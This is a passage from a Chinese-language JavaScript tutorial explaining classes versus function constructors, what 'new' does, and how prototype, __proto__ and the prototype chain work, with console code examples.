<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-title function_">sub</span>(<span class="hljs-number">11</span>, <span class="hljs-number">5</span>))</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029173231798.png" alt="image-20231029173231798"></p>
<p>基于我们在其它编程语言的习惯，上面的代码非常易于理解</p>
<p>上述代码中，<code>num</code>称为类<code>Calculator</code>的<strong>属性</strong>，<code>applyAdd、applySub</code>称为类<code>Calculator</code>的<strong>方法</strong>，<code>add、sub</code>称为类<code>Calculator</code>的<strong>静态方法</strong></p>
<p>在 ES6 之前，JavaScript 并没有提供 class 语法，类的功能是基于函数（function）来实现的，如下</p>
<pre><code class="hljs js"><span class="hljs-comment">// 创建类</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Calculator</span>(<span class="hljs-params">num</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = num
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applyAdd</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">op</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> += op
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applySub</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">op</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> -= op
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">num1, num2</span>) {
    <span class="hljs-keyword">return</span> num1 + num2
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property">sub</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">num1, num2</span>) {
    <span class="hljs-keyword">return</span> num1 - num2
}

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">applyAdd</span>(<span class="hljs-number">2</span>).<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-title function_">sub</span>(<span class="hljs-number">11</span>, <span class="hljs-number">5</span>))</code></pre>
<p>现在我们注意下面几个细节</p>
<ul>
<li>用函数实现时，<code>function Calculator</code>的内容（参数、函数体）与用类实现时的<code>constructor</code>相同</li>
<li>用函数实现时，<strong>方法</strong><code>applyAdd、applySub</code>声明在<code>Calculator.prototype</code>层中</li>
<li>用函数实现时，<strong>静态方法</strong><code>add、sub</code>直接声明在<code>Calculator</code>层中</li>
</ul>
<h2 id="32-new-做了什么">3.2 new 做了什么</h2>
<p>可以说 JavaScript 的任何一个对象都是一个 Object，不论是<code>Number``String``Array</code>等，它们都具有一种 <strong>JSON 结构</strong>（注意，JavaScript 中含有<code>JSON</code>类，此处的 JSON 泛指一种数据结构，与<code>JSON</code>类无关），我们称为“对象”，为了与类创建的实例（也称为“对象”）作区分，我们称类创建的实例为“实例”，“实例”也是“对象”</p>
<p>也就是说，函数<code>Calculator</code>本身就具有一种 JSON 结构，它具有它的 JSON 属性、JSON 方法</p>
<p>我们把注意力放在<code>let calc = new Calculator(1)</code>这一行上</p>
<p>事实上，这两种实现方法（用<code>class</code>语法和用函数实现）的<code>Calculator</code>最终具有相同的 JSON 结构，其中，基于函数的实现更接近 JavaScript 的本真逻辑，而<code>class</code>更像是一种<strong>语法糖</strong></p>
<p>**注意：**此处不要将两种实现方式的<code>Calculator</code>分别命名成<code>Calculator1</code>和<code>Calculator2</code>，然后通过<code>Calculator1 == Calculator2</code>或者<code>Calculator1 === Calculator2</code>去比较，它将永远返回<code>false</code>，因为两者的地址是不一样的，正如<code>[] == []</code>和<code>({}) == ({})</code>的返回值也是<code>false</code>一样</p>
<p>那么，根据我们所注意到的几个细节，我们猜测：</p>
<ol>
<li>进行 new 操作时，JavaScript 创建了一个新的 JSON 结构，这个结构<strong>继承</strong>自<code>Calculator</code>的<code>prototype</code>属性——这一过程引入了<strong>方法</strong></li>
<li>随后，以这个新创建的 JSON 结构为<code>this</code>，传递参数<code>num=1</code>并运行<strong>构造器</strong><code>constructor</code>中的内容——这一过程引入了<strong>属性</strong></li>
<li>至于<strong>静态方法</strong>则很好理解，我们调用静态方法写的是<code>Calculator.add``Calculator.sub</code>，那么这些静态方法也自然引入于<code>Calculator</code>的 JSON 结构本身之中</li>
</ol>
<p>实例创建后，为了追溯这一过程，新创建的实例的 JSON 结构会带有<code>constructor</code>属性，指向创建它的<strong>构造器</strong>，在此处为<code>Calculator</code>（函数）；带有<code>__proto__</code>属性，指向它的原型，也就是它继承过来的地方，在此处为<code>Calculator.prototype</code></p>
<p>接下来我们进行验证</p>
<p>我们注意到，基于函数实现的写法中，<code>new Calculator(1)</code>的<code>Calculator</code>本身是一个函数，事实上它就是<code>constructor</code>函数本身</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（不论是哪种类的实现方法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Calculator</span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029175445596.png" alt="image-20231029175445596"></p>
<p>即使用<code>class</code>语法创建，我们也能够看到<strong>方法</strong>位于<code>Calculator</code>的<code>prototype</code>之中</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（使用 class 语法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">applyAdd</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applyAdd</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">applySub</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applySub</span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029214147601.png" alt="image-20231029214147601"></p>
<p>结合上面的结论，显然，下面表达式的运行结果也是<code>true</code></p>
<pre><code class="hljs http">calc.applyAdd === calc.constructor.prototype.applyAdd
calc.applySub === calc.constructor.prototype.applySub</code></pre>
<p>接下来我们验证<code>calc</code>下面的<code>__proto__</code>，它指向了它的<strong>原型</strong></p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 创建实例（不论是哪种类的实现方法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">__proto__</span> === calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029214539647.png" alt="image-20231029214539647"></p>
<p>我们看到，new 的过程实际上就是根据类创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤：</p>
<ol>
<li>为实例添加<strong>方法</strong>：以类的<code>prototype</code>作为<strong>原型</strong>“复制”出一个新的对象（JSON 结构）</li>
<li>为实例添加<strong>属性</strong>、进行初始化操作：运行类的<strong>构造器</strong><code>constructor</code></li>
<li>为实例“添加”<code>constructor</code>和<code>__proto__</code>属性，分别指向创建它时的构造器和原型</li>
</ol>
<p>事实上，上述的描述并不准确，我们将在稍后予以纠正</p>
<h2 id="33-构造器-constructor">3.3 构造器 constructor</h2>
<p>刚才的 new 操作完全可以写成</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> calc2 = <span class="hljs-keyword">new</span> calc.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>)</code></pre>
<p>这意味着，创建一个类的含义就是创建了一个<strong>构造器</strong>函数，创建一个实例的含义就是在<strong>继承</strong>的基础上运行了这个构造器函数</p>
<p>为了确保继承过程顺利进行，这个构造器函数必须含有以下特征</p>
<ul>
<li>包含<code>prototype</code>属性</li>
</ul>
<p>而在 JavaScript 中，任意函数都默认具有<code>prototype</code>属性，因此，任意函数都符合一个构造器的标准，任意函数都是一个构造器，可用于生成类实例</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TestClass</span>(<span class="hljs-params"></span>) {}
<span class="hljs-keyword">let</span> test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>()</code></pre>
<p>以上代码并不会报错</p>
<p>在 JavaScript 中，<strong>继承</strong>这个概念贯彻在许多操作中，每一个新的 JSON 结构的诞生，都进行了类似 new 的逻辑，因此，任何一个对象（除了<code>null</code>）都具有<code>constructor</code>属性，包括构造器本身</p>
<p>构造器本身是一个函数，当我们循环访问<code>constructor</code>时将得到 JavaScript 预定义的构造器<code>Function</code>，而<code>Function</code>的构造器仍然是它本身</p>
<pre><code class="hljs js"><span class="hljs-title class_">Function</span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Function</span></code></pre>
<p>以上表达式将返回<code>true</code></p>
<p>我们可以总结出如下现象</p>
<ul>
<li>构造器链的尽头是<code>Function</code></li>
<li><code>Function</code>的构造器是<code>Function</code>本身</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029215044763.png" alt="image-20231029215044763"></p>
<p>下面这张图更加地趋近本质，可以稍后再来体悟</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029215113706.png" alt="image-20231029215113706"></p>
<h2 id="34-原型和继承">3.4 原型和继承</h2>
<p>当我们谈论 JavaScript 的原型，实际上是在谈论对象（JSON 结构）之间的特殊关系，有继承就有原型，有原型就有继承</p>
<p>原型的定义大致可以描述为：<code>A</code>和<code>B</code>是两个 JSON 结构，<code>B</code>继承于<code>A</code>，具有<code>A</code>的全部内容，那么称<code>A</code>就是<code>B</code>的原型</p>
<p>在 JavaScript 中，一个 JSON 结构就可以称为是一个具体的对象，甚至包括<code>Number``String</code></p>
<p><code>null</code>是一个特殊的对象，它表示空，如果把对象之间的继承关系画一个遗传系谱图，那么<code>null</code>就是这张图上最原始的祖先</p>
<p>我们具有构造器函数<code>Calculator</code>，它也是一个 JSON 结构（对象），具有一个属性<code>prototype</code>，我们可以将这个属性理解为创建实例时的“模板”，当创建实例时，实例会<strong>继承</strong>这个“模板”的全部内容</p>
<p>当我们单独说谁是原型时，其实并没有意义，<code>Calculator</code>的<code>prototype</code>不是<code>Calcualtor</code>的原型，而是<code>Calculator</code>所要创建的实例（<code>calc</code>）的原型，事实上，这里命名为<code>prototype</code>（英文译为“原型”）造成了重大的歧义，经常对初学者甚至从业多年的程序员造成巨大困扰，为了方便表述、避免歧义，我们之后将把构造器的<code>prototype</code>称为构造器的“原型模板”</p>
<p>构造器<code>Calculator</code>创建出实例<code>calc</code>后，<code>calc</code>含有一个属性<code>__proto__</code>，这个属性即为<code>calc</code>的原型</p>
<p>刚才我们也提到<code>Calculator.prototype</code>也是<code>calc</code>的原型，所以它们两个是等价的，下面的表达式将返回<code>true</code></p>
<pre><code class="hljs js">calc.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p>我们可以用一张图描述这种关系，下图中的<code>prototype</code>和<code>__proto__</code>在内存中具有完全相同的地址，只是它们所隶属的 JSON 结构不一样</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029220340685.png" alt="image-20231029220340685"></p>
<p>当访问<code>calc</code>下的<code>applyAdd</code>，如果<code>calc</code>自己没有<code>applyAdd</code>，则会从它的原型中去查找，从而实现继承</p>
<p>几乎所有 JavaScript 中的对象都有原型，在 JavaScript 中，可以访问任何对象的<code>__proto__</code>属性查看它的原型</p>
<p>另一方面，有原型就有继承，有继承就有相应的构造器，我们可以访问任何对象的<code>constructor</code>属性查看它的构造器</p>
<h2 id="35-原型对象-prototype-和-proto">3.5 原型对象 prototype 和 <strong>proto</strong></h2>
<p>首先我们需要分辨清楚<code>prototype</code>和<code>__proto__</code>的区别，以<code>Calculator</code>为例，这个构造器函数的原型并不是<code>Calculator.prototype</code>，而是<code>Calculator.__proto__</code>，<code>calc</code>的原型是<code>calc.__proto__</code>等于<code>Calculator.prototype</code></p>
<p>每一个实例都由它所对应的构造器所创建，因此每一个实例都具有<code>constructor</code>和<code>__proto__</code>属性，实例的<code>constructor.prototype</code>的地址与实例的<code>__proto__</code>一致</p>
<p>但值得注意的是，当我们循环访问<code>__proto__</code>时，最终将指向<code>null</code>，而当我们循环访问<code>constructor.prototype</code>时，最终将会给出相同的结果</p>
<p>这是因为一个<strong>构造器</strong>的“原型模板”的构造器就是构造器本身</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Number</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>
<span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Function</span>
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Calculator</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === calc.<span class="hljs-property">constructor</span></code></pre>
<p>以上表达式都将返回<code>true</code></p>
<p>这种“循环自引用”的逻辑或许会有些难以理解和记忆，但它这么设计是有它的意义所在的</p>
<p>如果我们将<code>prototype</code>的<code>constructor</code>修改成其它的将会发生什么？例如</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Number</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)</code></pre>
<p>然后我们访问<code>calc.constructor</code>，它将返回<code>Number</code>构造器</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029221210974.png" alt="image-20231029221210974"></p>
<p>让我们查看<code>calc</code>的 JSON 结构</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029221236044.png" alt="image-20231029221236044"></p>
<p>**注意：**这里的<code>&lt;prototype&gt;</code>（在<code>chromium</code>内核的浏览器可能显示的是<code>[[Prototype]]</code>），其实就是<code>calc</code>的原型<code>calc.__proto__</code>亦即<code>Calculator.prototype</code></p>
<p>因此，<code>calc</code>的<code>contructor</code>属性并不是被添加上去的，而是继承自<code>prototype</code>的，这是对先前“new 做了什么”的总结的第一个<strong>修正</strong>，这也说明了为什么一个构造器的<code>prototype.constructor</code>默认指向这个构造器本身</p>
<p>与<code>constructor.prototype</code>不同的是，<code>__proto__</code>将直接指向当前的 JSON 结构继承自哪里</p>
<pre><code class="hljs javascript"><span class="hljs-comment">// Calculator 请重新声明以覆盖前面对 prototype.constructor 的修改</span>
<span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">__proto__</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>
calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> === calc.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p>运行结果如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697186478753-9e04f15b-e05c-47b3-a548-aab0d5293c30.png" alt="img"></p>
<p>对于第一条运行结果是显然的</p>
<p>对于第三条运行结果，正如我们刚才所提到的，<code>prototype</code>的<code>constructor</code>将指向<code>calc.constructor</code>，从而形成一种“循环自引用”</p>
<p>对于第二条运行结果，我们观察<code>calc.__proto__.__proto__</code>的内容</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231029221852070.png" alt="image-20231029221852070"></p>
<p>我们注意到，calc.__proto__就是Calculator.prototype，它是一个 JSON 结构，这个 JSON 结构的原型应当是一个 JavaScript 预定义的构造器Object创建的</p>
<pre><code class="hljs js">calc.<span class="hljs-property">__proto</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-comment">//true</span></code></pre>
<p>至于为什么<code>calc.__proto__</code>（即<code>Calculator.prototype</code>）的<code>constructor</code>属性不<strong>默认</strong>指向<code>Object</code>以追求统一，这或许就是先前提到的 JavaScript 的内在逻辑为了<strong>继承</strong>方便的特性吧</p>
<p>现在，我们进行第二个对先前“new 做了什么”的总结的纠错</p>
<p>我们检查<code>calc</code>这个对象（JSON 结构）本身的层级是否具有<code>__proto__</code>属性</p>
<pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc, <span class="hljs-string">'__proto__'</span>)  <span class="hljs-comment">//false</span></code></pre>
<p>可见其实<code>calc</code>本身并不具有<code>__proto__</code>属性</p>
<p>在 JavaScript 中，当我们访问一个对象的<code>A</code>属性，如果当前对象的 JSON 结构中找不到<code>A</code>属性，JavaScript 会从它的原型中去寻找</p>
<p>由于这个特性的存在，如果它的原型（也是一个 JSON 结构）中找不到，会从它的原型的原型中去找，直到原型为<code>null</code>也没有找到则返回<code>undefined</code></p>
<p>**注意：**事实上，“原型”这个概念指的是程序运行的内在逻辑，而不是<code>__proto__</code>这些属性，是不容外部修改的，换句话说，<code>__proto__</code>默认指向了原型的地址，而并不是说改变<code>__proto__</code>则改变了原型</p>
<p>这一点可以通过修改<code>Object.prototype.a = 1</code>，然后运行<code>Object.defineProperty(calc, '__proto__', { value: 123 })</code>使得<code>calc.__proto__</code>的值变为<code>123</code>，然后访问<code>calc.a</code>进行验证，会发现它返回的结果是<code>1</code></p>
<p>我们追溯它的原型</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)
<span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)
<span class="hljs-title class_">Object</span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(calc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>, <span class="hljs-string">'__proto__'</span>)</code></pre>
<p>第一行返回了<code>false</code>，<code>calc.__proto__</code>即<code>Calculator.prototype</code>，它的原型的 JSON 结构本身也不具有<code>__proto__</code>属性</p>
<p>第二行返回了<code>true</code>，我们再次打印<code>calc.__proto__.__proto__</code>的结果</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697188839411-0fa63bd4-e6f0-4470-9039-d8d20b204854.png" alt="img"></p>
<p>这个结果和<code>Object.prototype</code>一致</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697188879878-5029f76e-32a9-4eea-bb8e-5c57a314457a.png" alt="img"></p>
<p>我们可以从<code>Object.prototype</code>的 JSON 结构中看到，它含有一个<code>__proto__</code>属性，但是它是一个 Getter，访问<code>__proto__</code>属性将运行这个 Getter 函数，将这个函数的返回值作为<code>__proto__</code>属性的值</p>
<p>所谓 Getter，就是指一个属性的值与一个函数相绑定，访问这个属性，它的值会通过一个函数动态获取，这个函数称为这个属性的 Getter 函数</p>
<p>相应的，还有 Setter 这一概念，当通过赋值语句<code>=</code>对这个属性进行赋值时，实际上是以<code>=</code>后面的值为函数的参数调用了它的 Setter 函数</p>
<p>对于<code>__proto__</code>这一 Getter，它的逻辑在 JavaScript 解释器的代码中得到定义，而并不是 JavaScript 语言本身能够定义的</p>
<p>我们可以通过运行如下代码判断一个它是不是一个 Getter</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>)</code></pre>
<p>运行结果如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697189214644-301a6aad-0d5b-4670-837b-42eb067c77b2.png" alt="img"></p>
<p>显然<code>__proto__</code>的值是通过<code>get: __proto__()</code>动态获取的</p>
<p>我们运行<code>Object.getOwnPropertyDescriptor(Object.prototype, '__proto__').get.call(calc)</code>（意思是以<code>calc</code>为这个 Getter 的 this 指针运行这个 Getter 函数）的结果和<code>cal.__proto__</code>一样</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697189450577-1a95a685-c26a-4a85-994e-d563770d3a28.png" alt="img"></p>
<p>因此，<code>calc</code>中的<code>__proto__</code>实际上是通过 JavaScript 中层层向原型访问的机制寻找到的，它最终通过<strong>原型链</strong>指向了<code>Object.prototype</code>中的<code>__proto__</code>这一带有 Getter 的属性</p>
<p>我们可以通过下面的代码将<code>Object.prototype</code>的<code>__proto__</code>修改为一个确定的、不带有 Getter 的值</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">123</span> })</code></pre>
<p>然后我们会发现众多对象的<code>__proto__</code>都变成了<code>123</code>，包括<code>calc</code>和<code>Calculator.prototype</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697190336018-c24b4710-ed71-4aa1-b9a7-153bd8246aa7.png" alt="img"></p>
<p>为了探查<code>calc</code>继承的逻辑，我们刷新一下网页或者重置一下 JavaScript 环境，重新创建<code>Calculator</code>对象和<code>calc</code>实例，运行如下代码对<code>Calculator.prototype</code>的<code>__proto__</code>进行修改</p>
